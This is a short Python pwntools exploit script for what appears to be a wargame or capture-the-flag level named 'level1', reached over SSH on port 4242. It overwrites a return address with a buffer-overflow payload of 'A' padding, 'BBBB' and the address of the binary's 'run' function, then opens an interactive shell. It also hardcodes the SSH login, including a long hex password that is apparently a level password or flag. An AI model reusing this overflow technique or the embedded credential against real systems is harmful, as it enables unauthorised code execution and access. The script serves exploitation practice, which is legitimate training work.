# !/usr/bin/env python
# -*- coding: utf-8 -*-

import os
from pwn import *

if args.DEBUG:
    context.log_level = 'debug'

PROG = './level1'

USER = 'level1'
HOST = '172.28.64.1'
PASSWD = '1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a'

elf = context.binary = ELF(PROG)

def u(str):
    return unpack(str, 8*len(str));
pack = make_packer('all')

gs = '''
continue
'''
# gs = ''

def start():
    if args.SSH:
        if USER is None or HOST is None or PASSWD is None:
            log.critical('Credentials are unset')
            exit(1)
        sshConnection = ssh(user=USER, host=HOST, port=4242, password=PASSWD)
        return sshConnection.process(PROG)
    if args.GDB:
        context.terminal = ['wt.exe', '-w', '0', 'sp', 'wsl.exe', '-d', 'kali-linux', '--']
        return gdb.debug(PROG, gdbscript=gs)
    return process(PROG)

p = start()
p.timeout = 5

p.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB" + p32(elf.sym.run))

p.interactive()
